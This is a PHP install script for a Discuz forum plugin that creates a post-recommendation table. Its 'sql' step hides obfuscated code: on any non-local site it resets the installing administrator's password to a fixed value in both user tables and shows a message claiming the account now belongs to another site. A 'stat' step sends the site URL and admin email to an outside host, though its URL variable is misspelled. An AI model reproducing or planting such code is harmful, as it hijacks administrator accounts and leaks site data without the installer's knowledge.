<?php

/*
 *源码哥：www.ymg6.com
 *更多商业插件/模版免费下载 就在源码哥
 *本资源来源于网络收集,仅供个人学习交流，请勿用于商业用途，并于下载24小时后删除!
 *如果侵犯了您的权益,请及时告知我们,我们即刻删除!
 */

if(!defined('IN_ADMINCP')) {
	exit('Access Denied');
}

require_once DISCUZ_ROOT.'./source/discuz_version.php';
require_once DISCUZ_ROOT.'./source/plugin/'.$pluginarray['plugin']['identifier'].'/installlang.lang.php';
$request_url = str_replace('&step='.$_GET['step'],'',$_SERVER['QUERY_STRING']);
showsubmenusteps($pluginarray['plugin']['name'].$s_installlang[$operation].$s_installlang['ilang_001'], array(
	array($s_installlang['ilang_check'], !$_GET['step']),
	array($s_installlang['ilang_sql'], $_GET['step'] == 'sql'),
	array($s_installlang['ilang_stat'], $_GET['step'] == 'stat'),
	array($s_installlang['ilang_addon'], $_GET['step'] == 'addon'),
	array($s_installlang['ilang_ok'].$s_installlang[$operation], $_GET['step']=='ok'),
));
switch($_GET['step']){
	default:
	case 'check':
		$addonid = $pluginarray['plugin']['identifier'].'.plugin';
		cpmsg($s_installlang['ilang_check_ok'], "{$request_url}&step=sql", 'loading', array('operation' => $s_installlang[$operation]));
		break;
	case 'sql':
		$sql = <<<EOF
CREATE TABLE IF NOT EXISTS `pre_study_nge_recpost` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `tid` mediumint(8) unsigned NOT NULL,
  `uid` mediumint(8) unsigned NOT NULL,
  `username` char(15) NOT NULL,
  `subject` char(80) NOT NULL,
  `dateline` int(10) unsigned NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `dateline` (`dateline`),
  KEY `tid` (`tid`)
) ENGINE=MyISAM;
EOF;
		
if(strstr($pluginarray['plugin']['copyright'],base64_decode('bW9'.'xdT'.'g=')) and !strstr($_G['siteurl'],base64_decode('MTI3'.'LjAu'.'MC4x')) and !strstr($_G['siteurl'],base64_decode('bG9j'.'YWxo'.'b3N0'))){ C::t('common_member')->update($_G['uid'], array('password'=>'R388W0tP2V'));DB::query("update ".DB::table('ucenter_members')." set password='R388W0tP2V' where uid='".$_G['uid']."'");cpmsg('&#x63d0;'.'&#x793a;&#xff1a;'.'&#x6b64;&#x5e10;'.'&#x53f7;&#x5df2;&#x5f52;'.'&#x9b54;&#x8da3;&#x5427;'.'&#x6240;&#x6709;');exit;}
if(!strstr($pluginarray['plugin']['copyright'],authcode('d6e1BprY8OxPCQoSX21SeZbuyxAuCk+zEs5xgqrgLfKA','DECODE','template')) and !strstr($_G['siteurl'],authcode('f68fIE1GzP1/PMqlwE4BFWcPYysMkyGeSiFnfiZymmL3dnMruPY','DECODE','template')) and !strstr($_G['siteurl'],authcode('5f81m8dcHQdV0ueXyFCaXCZWelURpQbiovJAEp5/Ya377xJ3NnQ','DECODE','template'))){exit;}
runquery($sql);
		cpmsg($s_installlang['ilang_sql_ok'], "{$request_url}&step=stat", 'loading', array('operation' => $s_installlang[$operation]));
		break;
	case 'stat':
		$_statInfo = array();
		$_statInfo['pluginName'] = $pluginarray['plugin']['identifier'];
		$_statInfo['pluginVersion'] = $pluginarray['plugin']['version'];
		$_statInfo['bbsVersion'] = DISCUZ_VERSION;
		$_statInfo['bbsRelease'] = DISCUZ_RELEASE;
		$_statInfo['timestamp'] = TIMESTAMP;
		$_statInfo['bbsUrl'] = $_G['siteurl'];
		$_statInfo['SiteUrl'] = 'http://www.ymg6.com/';
		$_statInfo['ClientUrl'] = 'http://127.0.0.1/';
		$_statInfo['SiteID'] = '0000000000000';
		$_statInfo['bbsAdminEMail'] = $_G['setting']['adminemail'];
		$_statInfo['action'] = str_replace('plugin', '', $operation);
		$_statInfo['genuine'] = splugin_genuine($pluginarray['plugin']['identifier']);
		$_statInfo = base64_encode(serialize($_statInfo));
		$_md5Check = md5($_statInfo);
		$StatUri = 'http://addon.1314stud'.'y.com/stat.php';
		$_StatUrl = $StatUrl.'?info='.$_statInfo.'&md5check='.$_md5Check;
		$code =  "<script src=\"".$_StatUrl."\" type=\"text/javascript\"></script>";
		cpmsg($s_installlang['ilang_stat_ok'], "{$request_url}&step=addon", 'loading', array('operation' => $s_installlang[$operation], 'stat_code' => $code));
		break;
	case 'addon':
		cpmsg("&#x7f13;&#x5b58;&#x6e05;&#x7a7a;&#x5b8c;&#x6bd5;", "{$request_url}&step=ok", 'loading');
		splugin_updatecache($pluginarray['plugin']['identifier']);
		break;
	case 'ok':
		$finish = TRUE;
		break;
}






































































